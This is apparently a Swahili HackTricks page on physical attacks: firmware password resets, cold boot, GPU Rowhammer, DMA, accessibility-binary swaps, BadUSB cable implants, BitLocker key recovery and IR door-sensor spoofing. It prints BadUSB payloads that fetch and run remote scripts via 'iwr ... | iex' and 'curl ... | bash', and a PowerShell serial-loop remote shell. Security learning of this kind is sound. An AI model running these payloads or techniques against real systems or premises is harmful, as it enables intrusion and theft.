# Mashambulizi ya Kimwili

{{#include ../banners/hacktricks-training.md}}

## Urejeshaji wa Nenosiri la BIOS na Usalama wa Mfumo

Mipangilio ya firmware ya PC za zamani inaweza kuwekwa upya kwa kukata betri ya CMOS au kutumia jumper iliyorekodiwa ya clear-CMOS. Muda unaohitajika wa kukata umeme hutegemea ubao husika, na nenosiri au funguo za UEFI za kisasa zinaweza kuhifadhiwa kwenye flash isiyopoteza data, kidhibiti kilichopachikwa, au kifaa cha usalama, na hivyo kubaki hata baada ya betri kuondolewa. Angalia mwongozo wa ubao/huduma kabla ya kufupisha pini; utaratibu huu pia unaweza kubatilisha vipimo vya TPM na kusababisha uhitaji wa urejeshaji wa usimbaji wa diski.

Kwenye mifumo ya zamani ya x86, zana kama **killCMOS** na **CmosPwd** zinaweza kukagua au kubadilisha mipangilio inayohifadhiwa na CMOS kutoka kwenye mazingira yanayoweza kuwashwa. CmosPwd hutambua miundo ya nenosiri kutoka kwenye orodha iliyorekodiwa ya familia za zamani za BIOS na inaweza kuhifadhi nakala, kurejesha, au kufuta/kuua hali ya CMOS; matoleo yake yaliyochapishwa yanalenga mazingira ya zamani ya DOS/Windows, Linux, FreeBSD na NetBSD.<sup>[[18]](#references)</sup> Huduma hizi si zana za jumla za kuondoa nenosiri la UEFI na zinahitaji ufikiaji wa kutosha wa maunzi/firmware.

Firmware ya baadhi ya laptop huonyesha msimbo wa changamoto maalum kwa mtengenezaji baada ya majaribio kadhaa ya nenosiri kushindwa. Hifadhidata kama [bios-pw.org](https://bios-pw.org) zinaweza kupata nenosiri la urejeshaji la zamani la mtengenezaji kwa baadhi ya modeli, lakini mifumo mingi hufunga ufikiaji bila changamoto inayoweza kutumika kupata nenosiri. Chukulia nenosiri lolote linalozalishwa kuwa maalum kwa modeli husika na epuka kufikisha kikomo cha kudumu cha majaribio.

### Usalama wa UEFI

Kwa mifumo ya kisasa ya **UEFI**, CHIPSEC inaweza kukagua ulinzi wa vigezo vya Secure Boot. Anza na ukaguzi usiobadilisha chochote ulio hapa chini; hali ya hiari ya `-a modify` hujaribu kwa makusudi kuharibu vigezo na inapaswa kutumiwa tu kwenye mfumo wa maabara unaoweza kurejeshwa. CHIPSEC yenyewe inaonya kuwa kiendeshi chake chenye ruhusa za juu na ufikiaji wa maunzi wa kiwango cha chini havifai kwa vifaa vya mwisho vya uzalishaji.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Uchambuzi wa RAM na Cold Boot Attacks

DRAM haipotezi kila biti mara moja refresh ikikoma. Kasi ya kuoza kwa data hutofautiana sana kulingana na teknolojia ya moduli na halijoto; kupoza kunaweza kuhifadhi data muhimu kwa muda mrefu zaidi kuliko kukata na kurejesha umeme bila kupoza. Cold-boot attack huwasha upya haraka hadi mazingira madogo ya kupata data, au huhamisha moduli iliyopozwa, kunasa memory ghafi, na kurejesha funguo za kriptografia licha ya biti kuharibika. Zana ya kunakili diski si lazima iwe kifaa cha kutengeneza taswira ya physical memory, na Volatility huchanganua capture badala ya kuipata; tumia zana ya kupata data iliyothibitishwa na inayofaa kwa jukwaa husika.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer Dhidi ya Page Tables

Mashambulizi ya kisasa ya GPU Rowhammer huwa na manufaa zaidi yanapolenga **metadata ya GPU virtual memory** badala ya buffer za kawaida. Utafiti wa hivi karibuni kuhusu **GDDR6 NVIDIA Ampere GPUs** unaonyesha kuwa mshambuliaji anayeendesha CUDA code bila ruhusa za juu anaweza kutengeneza mifumo ya hammering mahususi kwa GPU, kutumia **memory massaging** kuweka miundo ya paging kwenye safu zilizo hatarini, kisha kubadilisha biti kwenye **last-level page table** au **page directory** ya kati. Mara tu ingizo moja la tafsiri linapoharibiwa, mshambuliaji anaweza kuanzisha **GPU memory read/write ya kiholela**, kisha kuelekeza shambulizi kwenye kuathiri host.<sup>[[1]](#references)[[2]](#references)</sup>

### Muundo wa Exploitation

1. **Tambua safu zinazoweza kuhammeriwa** kwenye GDDR6 na utengeneze mifumo ya hammering inayozingatia refresh/isiyo sare ili kukwepa kinga za ndani ya DRAM.
2. **Fanya massage ya allocations za GPU** ili driver iweke miundo ya tafsiri ya page kwenye maeneo halisi yanayoweza kuhammeriwa, badala ya kuiweka kwenye pool chaguomsingi iliyolindwa. Kwa vitendo, hili linaweza kumaanisha kumaliza eneo la low-memory page-table na kusambaza UVM mappings kubwa na sparse zenye strides zinazodhibitiwa.
3. **Badilisha metadata ya tafsiri** kama vile biti za **PFN** au zinazohusiana na aperture ndani ya ingizo la page-table/page-directory, ili ukurasa pepe unaodhibitiwa na mshambuliaji uelekezwe kwenye kurasa za page-table, GPU memory ya kiholela, au mappings za mfumo zinazoonekana kwa host.
4. Tumia tena mapping iliyoghushiwa kuandika upya maingizo mengine ya tafsiri na kupandisha uwezo hadi **GPU memory read/write ya kiholela** katika GPU contexts mbalimbali.

### Kuelekeza Shambulizi kwa Host na Mitigation

- **IOMMU ikiwa imezimwa**, mappings za system-aperture zilizoghushiwa zinaweza kuanika **host physical memory** ya kiholela kwa GPU, na kubadilisha uwezo wa GPU kuwa kuathiri host kikamilifu.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** hulenga maingizo ya last-level page-table, ilhali **GeForge** inaonyesha kuwa kuharibu kiwango cha page-directory kunaweza kuwa rahisi zaidi kwa sababu kubadilisha biti moja kunaweza kuelekeza upya subtree kubwa ya tafsiri. Usichukulie kiwango kimoja tu cha paging kuwa muhimu kwa usalama.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bado ni muhimu kwa sababu huzuia njia ya moja kwa moja ya kufikia host memory kiholela inayotumiwa na GDDRHammer/GeForge, lakini **si mitigation kamili**. **GPUBreach** inaonyesha njia ya pili ya kuelekeza shambulizi: mshambuliaji huharibu CPU buffer zinazoweza kuandikwa na GPU na zinazomilikiwa na driver, kisha huchochea hitilafu za usalama wa memory kwenye NVIDIA driver ili kupata uwezo wa kuandika kwenye kernel na **root shell**, hata IOMMU ikiwa imewashwa.<sup>[[3]](#references)</sup>
- **System-level ECC** ni hatua ya vitendo ya kuimarisha usalama kwenye workstation/server GPU zinazoiunga mkono. Consumer GPU zisizo na ECC zina sehemu dhaifu zaidi ya ulinzi.<sup>[[4]](#references)</sup>
- Mashambulizi haya si ya kinadharia tu: **GeForge** iliripoti **1,171** bit flips kwenye RTX 3060 na **202** kwenye RTX A6000; idadi hiyo ilitosha kuunda mnyororo wa kufanya kazi wa kupandisha ruhusa za host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Mashambulizi ya Direct Memory Access (DMA)

Kwa offline UEFI IFR/NVRAM patching inayoweza kushusha kiwango cha utekelezaji wa IOMMU kabla ya boot na kuwezesha mnyororo wa DMA kwenye Windows, tazama:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** inaonyesha **upatikanaji na urekebishaji wa memory unaotegemea DMA** kupitia interfaces kama FireWire na usanidi wa awali wa Thunderbolt, pamoja na mbinu za kihistoria za kukwepa login. Si sahihi kusema tu kwamba “haifanyi kazi dhidi ya Windows 10”: uwezekano wa kutumia shambulizi hutegemea interface, build ya target, sera ya IOMMU, hali ya kufuli, na iwapo Windows Kernel DMA Protection inatumika na imewashwa. Windows 10 version 1803 na matoleo ya baadaye yalileta Kernel DMA Protection kwenye majukwaa yanayooana, na hivyo kubadilisha kwa kiasi kikubwa sehemu ya mashambulizi.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB kwa Ufikiaji wa Mfumo

Kwenye volume ya Windows ambayo haijasimbwa kwa njia fiche au ambayo tayari imefunguliwa, mazingira ya offline yanaweza kubadilisha accessibility binary kama vile **sethc.exe** au **Utilman.exe** na kuweka **cmd.exe**, na hivyo kutoa command prompt ya SYSTEM njia ya mkato inayolingana kwenye skrini ya kuingia inapotumiwa. Zana kama **chntpw** zinaweza kuhariri data ya akaunti ya SAM ya ndani. Mbinu hizi hazikwepi volume ya BitLocker iliyofungwa na zinaweza kuharibu credentials zinazolindwa na DPAPI/EFS; hifadhi nakala za forensics na backup.

**Kon-Boot** ni zana ya kibiashara ya kukwepa uthibitishaji wakati wa boot kwa usanidi fulani wa Windows/macOS unaoungwa mkono. Uoanifu hutegemea OS, hali ya firmware, Secure Boot, na usanidi wa usimbaji fiche wa diski; haifungui volume ya BitLocker iliyofungwa kwa kuiondoa usimbaji fiche.<sup>[[10]](#references)</sup>

---

## Kushughulikia Vipengele vya Usalama vya Windows

### Njia za Mkato za Boot na Recovery

- **Delete/Supr**, F2, F10, au kitufe kingine cha mtengenezaji kinaweza kufungua usanidi wa firmware.
- **F8** huingia kwenye chaguo za zamani za advanced boot za Windows tu kwenye usanidi ambako njia hiyo bado imewashwa; njia ya sasa ya kuingia kwenye recovery hutofautiana.
- Kushikilia **Shift** kunaweza kuzuia Windows kuingia kiotomatiki kwenye baadhi ya usanidi, ingawa mipangilio ya sera/registry inaweza kuzima tabia hiyo.<sup>[[17]](#references)</sup>

### Vifaa vya BAD USB

Vifaa kama **USB Rubber Ducky** na Teensy boards vinaweza kujitambulisha kama kibodi za HID zinazoaminika na kuingiza mibonyezo ya vitufe iliyobainishwa mapema. Mwanzoni, payload huwa na ruhusa na ufikiaji wa desktop wa session iliyoingia; vidokezo vya UAC, kufungwa kwa skrini, mpangilio wa kibodi, muda wa utekelezaji, na sera ya USB ya endpoint bado huiwekea mipaka.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Ruhusa za administrator au backup zinaweza kutumika kutengeneza shadow copy au kuhifadhi registry hives ili kupata faili zilizofungwa kama **SAM** na **SYSTEM**. Hii ni mbinu ya kukusanya data baada ya kuathiri mfumo, si njia ya kukwepa ruhusa za juu, na matukio yake yanapaswa kulinganishwa na matukio ya `diskshadow`/VSS na uhamishaji wa registry hive.

## Mbinu za BadUSB / HID Implant

### Implants za kebo za Wi-Fi managed

- Implants zinazotumia ESP32-S3 kama **Evil Crow Cable Wind** hujificha ndani ya kebo za USB-A→USB-C au USB-C↔USB-C, hujitambulisha pekee kama kibodi ya USB, na hutoa C2 stack yake kupitia Wi-Fi. Mwendeshaji anahitaji tu kuipa kebo umeme kutoka kwenye host ya mwathiriwa, kuunda hotspot yenye jina `Evil Crow Cable Wind` na nenosiri `123456789`, kisha kufungua [http://cable-wind.local/](http://cable-wind.local/) (au anwani yake ya DHCP) ili kufikia HTTP interface iliyopachikwa.<sup>[[8]](#references)</sup>
- UI ya kivinjari ina tab za *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, na *Config*. Payload zilizohifadhiwa huwekewa lebo kulingana na OS, mpangilio wa kibodi hubadilishwa papo hapo, na mifuatano ya VID/PID inaweza kubadilishwa ili kuiga peripherals zinazojulikana.
- Kwa kuwa C2 imo ndani ya kebo, simu inaweza kuweka payload tayari, kuanzisha utekelezaji, na kudhibiti credentials za Wi-Fi bila kutumia mtandao wa shirika—jambo linalofaa kwa uvamizi wa kimwili wa muda mfupi.

### Payload za AutoExec zinazotambua OS

- Kanuni za AutoExec huunganisha payload moja au zaidi ili zitekelezwe mara moja baada ya USB kujitambulisha. Implant hufanya utambuzi wa OS wa msingi na kuchagua script inayolingana.
- Mfano wa mtiririko wa kazi:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) au `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Kwa kuwa utekelezaji hufanyika bila uangalizi, kubadilisha tu kebo ya kuchajia kunaweza kuwezesha ufikiaji wa awali wa “plug-and-pwn” katika muktadha wa mtumiaji aliyeingia.

### Remote shell inayoanzishwa na HID kupitia Wi-Fi TCP

1. **Uanzishaji kwa keystroke:** Payload iliyohifadhiwa hufungua console na kubandika loop inayotekeleza chochote kinachowasili kupitia kifaa kipya cha USB serial. Mfano mdogo wa Windows ni:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant huweka channel ya USB CDC wazi huku ESP32-S3 yake ikianzisha TCP client (Python script, Android APK, au executable ya desktop) ya kuunganishwa tena na operator. Byte zozote zinazoandikwa kwenye TCP session hutumwa kwenye serial loop iliyo hapo juu, na hivyo kutoa remote command execution hata kwenye hosts zilizotengwa na mtandao. Output ni chache, kwa hiyo operators kwa kawaida huendesha commands bila kuona matokeo (kuunda akaunti, kuweka tooling ya ziada, n.k.).

### Eneo la HTTP OTA update

- Interface ya Evil Crow Cable Wind iliyoandikwa kwenye nyaraka hufichua endpoint ya kusasisha firmware isiyohitaji uthibitishaji kwenye `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Waendeshaji wa uga wanaweza kubadilisha vipengele vya hot-swap (kwa mfano, kuwasha firmware ya USB Army Knife) katikati ya operesheni bila kufungua kebo, hivyo implant inaweza kubadili kwenda kwenye uwezo mpya ikiwa bado imechomekwa kwenye host lengwa.

## Kukwepa Usimbaji Fiche wa BitLocker

Upatikanaji wa kiuchunguzi ulioidhinishwa kutoka kwenye mfumo ulio hai au uliokuwa ukiendeshwa hivi karibuni unaweza kuwa na ufunguo mkuu wa volume ya BitLocker au nyenzo nyingine zinazohusiana na ufunguo wakati volume haijafungwa. Zana za kibiashara kama Elcomsoft Forensic Disk Decryptor na Passware Kit Forensic zinaweza kutafuta kwenye picha za kumbukumbu, faili za hibernation au crash dumps zinazotumika, lakini hakuna hakikisho la kufanikiwa. Windows za kisasa pia husimba crash dumps kwa njia fiche BitLocker ikiwa imewezeshwa, na nenosiri la urejeshaji lenye tarakimu 48 lililohifadhiwa ni kifaa tofauti na ufunguo wa volume ulio kwenye kumbukumbu.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Uhandisi wa Kijamii ili Kuongeza Ufunguo wa Urejeshaji

Mshambulizi anayemshawishi msimamizi kuendesha amri za usimamizi wa BitLocker anaweza kuongeza nenosiri la urejeshaji, ufunguo wa nje au protector nyingine, kisha kuinasa. Nenosiri la urejeshaji haliwezi kuwa mfuatano wowote wa sufuri: manenosiri ya nambari ya urejeshaji ya BitLocker yana muundo sanifu wa tarakimu 48. Sintaksia husika ya usimamizi ulioidhinishwa ni `manage-bde -protectors -add C: -recoverypassword`; orodhesha protectors zilizoongezwa kwa kutumia `manage-bde -protectors -get C:`. Fuatilia nyongeza za protector na uhakikishe kuwa nyenzo mpya za urejeshaji zinahifadhiwa kwa usalama katika maeneo yaliyoidhinishwa pekee.<sup>[[16]](#references)</sup>

---

## Kutumia Swichi za Kuingiliwa kwa Chassis / Matengenezo ili Kurejesha BIOS kwenye Mipangilio ya Kiwandani

Laptop nyingi za kisasa na kompyuta za mezani zenye umbo dogo zina **swichi ya kuingiliwa kwa chassis** inayofuatiliwa na Embedded Controller (EC) na firmware ya BIOS/UEFI. Ingawa kusudi kuu la swichi hiyo ni kutoa tahadhari kifaa kinapofunguliwa, wakati mwingine watengenezaji hutekeleza **njia ya urejeshaji isiyoandikwa kwenye nyaraka** ambayo huwashwa swichi inapobonyezwa kwa mpangilio mahususi.<sup>[[5]](#references)[[6]](#references)</sup>

### Jinsi Shambulio Linavyofanya Kazi

1. Swichi imeunganishwa kwenye **GPIO interrupt** kwenye EC.
2. Firmware inayoendeshwa kwenye EC hufuatilia **muda na idadi ya mibofyo**.
3. Muundo uliowekwa kwenye msimbo unapogunduliwa, EC huanzisha utaratibu wa *mainboard-reset* unaofuta **maudhui ya NVRAM/CMOS ya mfumo**.
4. Kwenye kuwasha upya kunakofuata, modeli zilizoathiriwa hupakia hali ya firmware iliyowekwa upya. Kulingana na mtengenezaji na toleo, hali iliyofutwa inaweza kujumuisha nenosiri la msimamizi, mipangilio maalum ya kuwasha au funguo za Secure Boot zilizosajiliwa; hali ya TPM na athari kwa usimbaji fiche wa diski lazima zichunguzwe kando.

> Kuweka upya firmware kunaweza kurejesha chaguo za kuwasha kutoka kwenye vifaa vya nje, lakini **hakufuti usimbaji fiche wa hifadhi**. BitLocker au mfumo mwingine wa usimbaji fiche wa diski nzima unaweza kuingia kwenye hali ya urejeshaji baada ya mabadiliko ya TPM/firmware na bado kulinda diski ya ndani bila ufunguo wa urejeshaji.<sup>[[16]](#references)</sup>

### Mfano Halisi – Laptop ya Framework 13

Njia ya urejeshaji ya Framework 13 (kizazi cha 11/12/13) ni:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Baada ya mzunguko wa kumi, EC huweka flag inayoelekeza BIOS kufuta NVRAM wakati wa kuwasha upya kunakofuata. Utaratibu mzima huchukua takriban sekunde 40 na hauhitaji **chochote isipokuwa bisibisi**.<sup>[[5]](#references)</sup>

### Utaratibu wa Jumla wa Exploitation

1. Washa kifaa lengwa au kiamshe kutoka hali ya kusimamisha ili EC iwe inafanya kazi.
2. Ondoa kifuniko cha chini ili kufikia swichi ya intrusion/maintenance.
3. Rudia mpangilio wa kubadilisha hali unaotegemea mtengenezaji (tazama nyaraka au majukwaa, au fanya reverse engineering ya firmware ya EC).
4. Kusanya kifaa upya na ukwashe tena, kisha kagua ni mipangilio na credentials zipi za firmware zilizobadilika.
5. Ikiwa umeidhinishwa na kuwasha kutoka kifaa cha nje kunawezekana, washa mfumo wa live image unaoudhibiti. Mara tu volume ya ndani inapofunguliwa kihalali (au ikiwa haikuwahi kusimbwa kwa njia fiche), mazingira ya live yanaweza kupata credentials na data au kukagua EFI System Partition. Kurekebisha partition hiyo ili kusakinisha EFI implant ni jambo linalodumu na linaingilia sana, na bado huzuiwa na Secure Boot, measured boot, ulinzi wa uandishi wa firmware na ufuatiliaji wa endpoint. Hifadhi iliyosimbwa kwa njia fiche hubaki bila kufikika bila ufunguo wake au nyenzo za kurejesha ufikiaji.

### Ugunduzi na Upunguzaji wa Hatari

* Rekodi matukio ya chassis-intrusion kwenye console ya usimamizi wa OS na uyahusishe na reset za BIOS zisizotarajiwa.
* Tumia **mihuri inayoonyesha dalili za kufunguliwa** kwenye skrubu/vifuniko ili kugundua kufunguliwa.
* Hifadhi vifaa katika **maeneo yanayodhibitiwa kimwili**; chukulia ufikiaji wa kimwili kuwa sawa na compromise kamili.
* Ikiwa inapatikana, zima kipengele cha mtengenezaji cha “maintenance switch reset” au hitaji idhini ya ziada ya kriptografia kwa reset za NVRAM.

---

## Uingizaji Fiche wa IR Dhidi ya Sensor za Kutoka Bila Kugusa

### Sifa za Sensor

- Sensor za kawaida za “wave-to-exit” huunganisha kisambaza mwanga cha near-IR LED na moduli ya kipokezi inayofanana na ya rimoti ya TV, ambayo huripoti logic high tu baada ya kupokea mipigo kadhaa (~4–10) ya carrier sahihi (≈30 kHz).<sup>[[7]](#references)</sup>
- Kifuniko cha plastiki huzuia kisambaza na kipokezi kutazamana moja kwa moja, kwa hiyo kidhibiti hudhani kuwa carrier yoyote iliyothibitishwa imetokana na mwangaza uliorudi kutoka karibu, na huendesha relay inayofungua komeo la mlango.
- Mara tu kidhibiti kinapoamini kuwa kuna kitu lengwa, mara nyingi hubadilisha envelope ya modulation inayotoka, lakini kipokezi huendelea kukubali burst yoyote inayolingana na carrier iliyochujwa.

### Mtiririko wa Attack

1. **Nasa wasifu wa utoaji wa mawimbi** – unganisha logic analyser kwenye pini za kidhibiti ili kurekodi waveforms za kabla na baada ya utambuzi zinazodhibiti IR LED ya ndani.
2. **Rudia waveform ya “baada ya utambuzi” pekee** – ondoa/tupilia mbali kisambaza mawimbi cha kawaida na uendeshe IR LED ya nje kwa kutumia pattern iliyowashwa tayari tangu mwanzo. Kwa kuwa kipokezi huzingatia tu idadi/marudio ya mipigo, huchukulia carrier bandia kuwa mwangaza halisi uliorudi na kuwasha laini ya relay.
3. **Dhibiti muda wa utumaji** – tuma carrier kwa burst zilizopangwa (kwa mfano, iwake kwa makumi ya milisekunde, kisha izime kwa muda kama huo) ili kutoa idadi ya chini kabisa ya mipigo bila kuzidisha AGC ya kipokezi au mantiki yake ya kushughulikia mwingiliano. Utoaji endelevu hufanya sensor ipoteze unyeti haraka na relay ikome kuwashwa.

### Uingizaji wa Mawimbi Yaliyorudi kwa Umbali Mrefu

- Kubadilisha LED ya maabara na diode ya IR yenye nguvu ya juu, driver ya MOSFET na optics za kulenga huwezesha kuwasha sensor kwa uhakika kutoka umbali wa takriban mita 6.
- Mshambuliaji hahitaji kuwa na line-of-sight ya tundu la kipokezi; kulenga boriti kwenye kuta za ndani, rafu au fremu za milango zinazoonekana kupitia kioo huruhusu nishati iliyorudi kuingia kwenye eneo la mwonekano la ~30° na kuiga wimbi la mkono la karibu.
- Kwa kuwa vipokezi vinatarajia mwangaza hafifu uliorudi, boriti ya nje yenye nguvu zaidi inaweza kuruka kwenye nyuso kadhaa na bado kuzidi kiwango cha chini cha utambuzi.

### Tochi ya Attack Iliyobadilishwa kwa Silaha

- Kuficha driver ndani ya tochi ya kawaida hufanya kifaa kisionekane cha kutiliwa shaka. Badilisha LED inayoonekana na IR LED yenye nguvu ya juu inayolingana na bendi ya kipokezi, ongeza ATtiny412 (au kifaa sawia) ili kutoa burst za ≈30 kHz, na utumie MOSFET kupitisha mkondo wa LED.
- Lenzi ya zoom inayovutika hukaza boriti kwa umbali/usahihi, huku motor ya mtetemo inayodhibitiwa na MCU ikitoa uthibitisho wa haptic kwamba modulation inafanya kazi bila kutoa mwanga unaoonekana.
- Kubadilisha kati ya pattern kadhaa za modulation zilizohifadhiwa (masafa ya carrier na envelope tofauti kidogo) huongeza ulinganifu na familia za sensor zilizouzwa upya chini ya chapa tofauti, na kumwezesha mtumiaji kuelekeza boriti kwenye nyuso zinazorudisha mwanga hadi relay isikike ikibofya na mlango kufunguka.

---

## References

- [1] [GDDRHammer: Kuvuruga Sana Safu za DRAM — Mashambulizi ya Rowhammer ya Vipengele Mtambuka kutoka GPU za Kisasa](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Kupiga Nyundo Kumbukumbu ya GDDR ili Kutengeneza Jedwali za Kurasa za GPU kwa Burudani na Faida](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Mashambulizi ya Kuinua Marupurupu kwenye GPU kwa Kutumia Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Taarifa ya Usalama: Rowhammer - Julai 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Bonyeza hapa ili kufanya pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mwongozo wa Reset ya Mainboard](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Hapanaaaaa, Usiguse! – Kukwepa Sensor za IR za Kutoka Bila Kugusa kwa Tochi Fiche ya IR”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Chomeka, Cheza, Fanya Pwn: Hacking kwa Kutumia Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Shambulio la Rowhammer Dhidi ya Chipu za NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Nyaraka rasmi za Kon-Boot na taarifa za ulinganifu](https://kon-boot.com/)
- [11] [Nyaraka za CHIPSEC - Ulinzi wa vigezo vya Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Tusisahau: Mashambulizi ya Cold Boot dhidi ya Funguo za Usimbaji Fiche](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - Udanganyifu wa kumbukumbu halisi kupitia DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Ulinzi wa Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Nyaraka za Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Mwongozo wa matumizi ya BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Tabia ya kushikilia Shift na kuingia kiotomatiki](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Nyaraka na vipakuliwa vya CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
